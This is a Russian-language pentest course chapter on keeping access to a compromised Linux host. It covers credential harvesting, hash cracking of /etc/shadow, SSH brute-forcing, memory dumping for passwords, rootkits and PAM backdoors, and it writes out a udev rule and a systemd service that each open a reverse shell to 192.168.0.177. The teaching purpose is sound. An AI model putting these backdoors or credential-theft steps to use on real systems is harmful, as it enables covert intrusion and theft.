********************* 8.2 Получение легитимного доступа к системе ********************
Получение легитимного доступа к системе

Данная категория раскрывает методы закрепления доступа, позволяющие закреплять доступ к системе, не внося в систему
изменения, используя существующие учетные данные и способы доступа к системе.

Плюсы подхода:

    Наименее заметный для команды реагирования подход к закреплению доступа, т.к. в систему не вносится никаких изменений, которые можно было бы заметить.
    Такой подход может предоставлять доступ достаточно долго, если инцидент с компрометацией системы не был обнаружен.

Минусы подхода:

    Если инцидент компрометации стал известен, то самой очевидной из практик защиты становится изменения паролей и ключей доступа к системе, что несет собой потерю доступа к системе для пентестера.
    Такой подход не работает лучше при использовании совмещения его с другими подходами, т.к. если мы используем инвазивные методы закрепления, в случаи их обнаружения мы потеряем и данный способ закрепления.
    Учетные данные могут быть изменены и без обнаружения факта компрометации системы по воле оператора, обслуживающего систему.

Получение легитимного доступа к системе может быть достигнуто следующими практиками:

    Извлечение паролей и ключей из доступных файлов в ОС
    Восстановление паролей из хешей
    Подбор паролей методом перебора
    Восстановление паролей и ключей из памяти процессов

Извлечение паролей и ключей из доступных файлов в ОС

Для поиска паролей и пр. секретов в файловой системе ОС можно использовать скрипты энумерации: LinPeas, WinPeas и пр.
Подробнее познакомимся с ними позже.
08_02_01.png


Восстановление паролей из хешей

Для восстановления паролей из хешированных значений пригодятся такие инструменты, как JohnTheRipper.

    John the Ripper — это инструмент для восстановления паролей, который может использоваться для анализа файлов паролей и
    попытки восстановления паролей. Для использования John the Ripper для анализа файлов паролей вам нужно выполнить
    следующие команды:

$ sudo cp /etc/shadow /tmp/shadow
$ sudo unshadow /etc/passwd /tmp/shadow > /tmp/unshadowed
$ john /tmp/unshadowed

В случае, если вы обнаружили прочие хеши паролей от других сервисов в ОС, можно воспользоваться более универсальной
утилитой Hashcat.

    Hashcat — это инструмент для взлома паролей, который может использоваться для анализа хешей паролей и попыток их взлома.

Hashcat поддерживает множество различных алгоритмов хеширования, таких как MD5, SHA1, SHA256, bcrypt и многие другие.
Вот пример команды для запуска hashcat для взлома хешей MD5:

hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

где

    -m 0 означает, что мы используем алгоритм хеширования MD5
    -a 0 означает, что мы используем атаку перебора
    hash.txt — это файл с хешами паролей, которые мы пытаемся взломать
    /usr/share/wordlists/rockyou.txt — это словарь, который мы используем для перебора паролей.

Это только один пример использования hashcat. Для каждого алгоритма хеширования и типа атаки существуют различные
параметры и настройки, которые могут быть использованы в hashcat.

Существуют и другие подходы к взлому хеша. Отличаются зачастую только подходом верификации пароля (локально/удалённо и пост/пре-хешировании)

Для ускорения атаки могут использоваться радужные таблицы. Подробнее тут. https://spy-soft.net/rainbow-tables-kali-linux-rainbowcrack/

Радужная таблица — специальный вариант таблиц поиска для обращения криптографических хеш-функций, использующий механизм разумного компромисса между временем поиска по таблице и занимаемой памятью.

Предварительно вычисляются радужные таблицы, которые затем используются для быстрого нахождения паролей, соответствующих хэшам. 

Также существует атака «дней рождения». Этот тип атаки связан с нахождением коллизий в хэш-функциях. Подробнее тут. https://habr.com/ru/articles/461163/

Подобрать пароль по хешу можно и с помощью онлайн-сервисов. Подробнее https://spy-soft.net/kak-rasshifrovat-xesh-bez-dolgix-vychislenij/


Подбор паролей методом перебора

На этом этапе могут быть использованы уже известные нам утилиты для атак методом перебора.

    Минус такого подхода в качестве инструмента для закрепления доступа в том, что мы должны предустановить инструмент на машину для обеспечения большей скорости обращений, что с высокой долей вероятности будет заметно командой реагирования и отразится в журналах аудита.

Тем не менее такими инструментами могут послужить nmap, patator или hydra, а также прочие менее известные скрипты для атак методом перебора. Использовать такие инструменты лучше в виде портативных файлов для вашей версии ОС, чтобы не устанавливать их через стандартные механизмы ОС.
Пример команды для запуска атаки методом перебора на SSH сервис утилиты patator:

patator ssh_login host=192.168.0.1 user=admin password=FILE0 0=/путь/к/файлу_с_паролями.txt -x ignore:fgrep='Permission denied'

Пример команды для запуска атаки методом перебора на SSH-сервис утилиты nmap:

nmap --script ssh-brute --script-args userdb=usernames.txt,passdb=passwords.txt <target>, где

    --script ssh-brute – указывает использование скрипта для перебора паролей ssh.
    --script-args userdb=usernames.txt,passdb=passwords.txt – указывает на файлы, содержащие список пользователей и паролей соответственно.
    <target> – целевой IP-адрес или диапазон адресов.

Скачать прекомпилированный бинарный файл nmap можно тут. https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap



Восстановление паролей и ключей из памяти процессов

Восстановление паролей и ключей из памяти процессов в Linux реализовано не так разнообразно как в Windows, но тоже остается возможным. Для этого используются специальные инструменты и подходы.
Пример:

Mimipenguin — это инструмент для перехвата паролей из памяти процессов, работающих на Linux-системе. Обычно он
используется для получения паролей, введенных пользователем в терминал, например, паролей от системы или приложений.
После запуска Mimipenguin начнет мониторить процессы в системе и попытается извлечь пароли из памяти процессов. Если он найдет пароли — он отобразит их в терминале.
08_02_02.png

Другой пример:

truffleproc — это инструмент для перехвата паролей из памяти любых процессов работающих в системе Linux, который ищет
пароли и ключи API в процессах по регулярным выражениям выполняя выгрузку памяти процесса и анализируя ее.

    Ссылка на инструмент: https://github.com/controlplaneio/truffleproc

Вы можете сделать то же самое вручную, выбрав нужный процесс.

Если вы обнаружите, что процесс аутентификации запущен:

# ps -ef | grep "authenticator"
> root 2027 2025 0 11:46 ? 00:00:00 authenticator

Вы можете сделать дамп процесса (например, инструментом memory-dump   https://github.com/hajzer/bash-memory-dump) и поискать учетные данные в памяти:

# ./dump-memory.sh 2027
# strings *.dump | grep -i

Прочие подобные утилиты:

    3snake – перехват паролей ssh, sudo и su (experimental)
    SSHPry2.0 – перехват данных в терминале
    Gimmecredz – дамп паролей в памяти (на основе bash)



Внесение изменений в легитимные механизмы доступа

Подходы в данной категории вносят в систему минимальные изменения, используя существующие механизмы аутентификации, но добавляя в них новые сущности и условия.

Плюсы подхода:

    Наиболее простой из существующих подходов, который может использоваться для быстрого продвижения по сети.
    Может быть легко модифицирован для меньшей заметности изменений в системе.

Минусы подхода:

    Крайне заметный метод, в связи с постоянным пристальным аудитом изменений учетных записей в ОС или в домене со стороны команд реагирования.
    Как и прошлый метод, не гарантирует закрепления в системе, т.к. администратор или оператор системы может по своей воле изменить учетные данные скомпрометированного аккаунта.

Примеры действий:

    Создание нового пользователя
    Изменение учетных данных пользователя
    Добавление ключей доступа
    Сброс до стандартных паролей и учетных данных в сервисах
    Открытие механизмов отладки в службах



Внесение изменений в сервисы и внешние программы в ОС

Способы закрепления доступа через внесение изменений в сервисы и внешние программы подразумевают изменения конфигурации или программного кода, постоянно работающих в ОС и доступных для взаимодействия с пользователями извне.

Плюсы подхода:

    Достаточно скрытный метод закрепления доступа, т.к. логирование изменений в сервисах происходит на общем уровне внесения изменений в файловую систему, что может быть сложнее заметить команде реагирования.
    На доступность такого метода не влияет изменений учетных данных, прав доступа пользователей ОС.
    Заложенные backdoor’ы в программный код сервисов могут быть обнаружены только профессионалами, понимающими природу возникновения уязвимостей и умеющих отличить уязвимостей поведение от нормального.
    Также одним из способов закрепления может быть обнаружение прочих уязвимостей сервиса без внесения в него изменений.

Минусы подхода:

    В случае отката версии кода сервиса к последней стабильной, такой доступ может быть потерян. А это вероятно, если администратор сочтет поведение сервиса странным.
    Может быть замечен если в ОС стоит аудит внесения изменения в файловую систему и в особенности в файлы конфигурации.

Примеры:

    Внедрение бэкдоров в сервисы ОС
    Внедрение уязвимого поведения в сервисы ОС, для последующей эксплуатации уязвимостей
    Запуск внешних программ для получения последующего контроля



Внесение изменений в ядро ОС и в предустановленные службы на нем

Самые продвинутые и зачастую самые надежные подходы по закреплению доступа - это серия методов, позволяющих проникать глубоко в ядро ОС и изменять стандартные службы удаленного доступа, аутентификации, обработки событий и пр.

Плюсы подхода:

    Некоторые из методов почти невозможно обнаружить при использовании стандартных средств анализа ОС, только используя глубокий анализ дампа памяти ОС. (Существуют методы, которые скрывают свое наличие при входе на сервер администратора и потом возвращают свое присутствие)
    Такие методы зачастую могут действовать даже после обновления ОС, и в частных случаях даже после переустановки ОС.
    Реализовать такой метод без действий, которые могут быть замечены в ходе выполнения, может быть не просто.

Минусы подхода:

    Высокая сложность реализации таких методов, а также сложность их отладки.
    Разница в версии ОС или дистрибутиве может быть критически важной для выбора метода закрепления из этой категории.

Одним из самых популярных примеров внесения изменений в ядро ОС и закреплением на уровне ядра, может быть использование программ под общим названием RootKit.

Rootkit — это вид вредоносного программного обеспечения, которое скрывает свою присутствие на компьютере или другом
устройстве, изменяя функциональность операционной системы и скрывая свои следы от пользователей и системных программ.

Например:

    TripleCross (https://github.com/h3xduck/TripleCross) - это Linux eBPF-руткит с открытым исходным кодом, который демонстрирует наступательные возможности технологии eBPF*.

    * eBPF (Extended Berkeley Packet Filter) - это технология ядра Linux, которая позволяет расширять функциональность стандартного фильтра Berkeley Packet Filter (BPF) для обработки пакетов и мониторинга событий в ядре.
    Работа eBPF осуществляется через специальное виртуальное машинное окружение (VM), которое запускается внутри ядра Linux.Оно позволяет загружать и исполнять программы на языке C, которые могут обрабатывать пакеты на уровне ядра, принимать решения о пересылке или отбрасывании пакетов, создавать и мониторить события в ядре и многое другое.

Также для закрепления доступа используют ПО, именуемое Remote Admin Tool, что по своей сути очень похоже на RootKit, но
иногда не претендует на скрытность. Тем не менее, в этой категории также присутствуют заметные представители. В том числе существуют легальные RAT-средства.

Утилиты RAT (Remote Access Tool) — это программные инструменты, которые позволяют удаленно управлять компьютером или устройством без ведома пользователя. RAT-утилиты могут быть использованы для различных целей, в том числе для управления компьютером из удаленного места, сбора конфиденциальной информации, мониторинга активности пользователя и т.д.

    Например: https://github.com/n1nj4sec/pupy
08_02_03.png

Внедрение бэкдоров модули аутентификации на основе PAM

PAM (Pluggable Authentication Modules, подключаемые модули аутентификации) — разделяемые библиотеки, используемые для
реализации произвольных методов аутентификации в виде единого API. Внедрение вредоносного модуля позволяет добавить
мастер-пароль и перехватить учетные данные.

    Пример бэкдора: https://github.com/ociredefz/pambd/

Внедрение бэкдоров в драйверы

Для запуска бэкдора при подключении какого-либо устройства можно использовать каталог /etc/udev/rules.d/, в котором хранятся правила для обработки событий устройств. Изменяя эти правила, можно переименовать устройство, настроить права доступа к нему, но самое главное, что нас интересует — выполнить скрипт при подключении устройства.

RSHELL="0<&196;exec 196<>/dev/tcp/192.168.0.177/9001; sh <&196 >&196 2>&196"
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null

В таком случае при подключении к машине USB-устройства порт выполнится скрипт RSHELL для предоставления доступа вашей машине в сети.

Внедрение бекдоров в службы автозапуска (использование systemd)

systemd — это системный инициализатор и менеджер служб для операционных систем Linux. Он является заменой для более старой системы инициализации SysVinit и предоставляет целый набор функциональных возможностей для управления и контроля запуска служб и процессов в Linux-системе.

    Systemd также имеет ряд дополнительных функций, включая событийную систему, журналирование и мониторинг процессов,
    управление сетевыми интерфейсами и сетевыми соединениями, управление контейнерами и многие другие.

Чтобы создать свой бэкдор в системе systemd, достаточно описать свой собственный сервис:

[Unit]
Description=Backdoor
After=network.target ssh.service

[Service]
Type=simple
PIDFile=/var/run/backdoor.pid
ExecStart=sh -i >& /dev/tcp/192.168.0.177/9001 0>&1"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

Расположить его в файле: 

 /lib/systemd/system/backdoor.service

Запустить его командами:

sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service



Материалы для самостоятельного изучения

    Популярные способы закрепления https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md
    Обзор подходов к закреплению на русском https://habr.com/ru/post/568298/
    Использование persistence модуля в фреймворке Metasploit. https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/local/service_persistence.md

Методики privesc:

    Book.hacktricks Privilege-Escalation  https://book.hacktricks.xyz/linux-hardening/privilege-escalation
    Privilege-Escalation  https://github.com/Ignitetechnologies/Privilege-Escalation
    Container-breakouts-part1  https://blog.nody.cc/posts/container-breakouts-part1/

Полезные инструменты и техники:

    Upgrading simple shells to fully interactive ttys  https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
    linPEAS  https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
    linux-smart-enumeration https://github.com/diego-treitos/linux-smart-enumeration
    3snake https://github.com/blendin/3snake
    pspy  https://github.com/DominicBreuker/pspy
    libprocesshider  https://github.com/gianlucaborello/libprocesshider
    pambd  https://github.com/ociredefz/pambd
    sucrack  https://github.com/hemp3l/sucrack




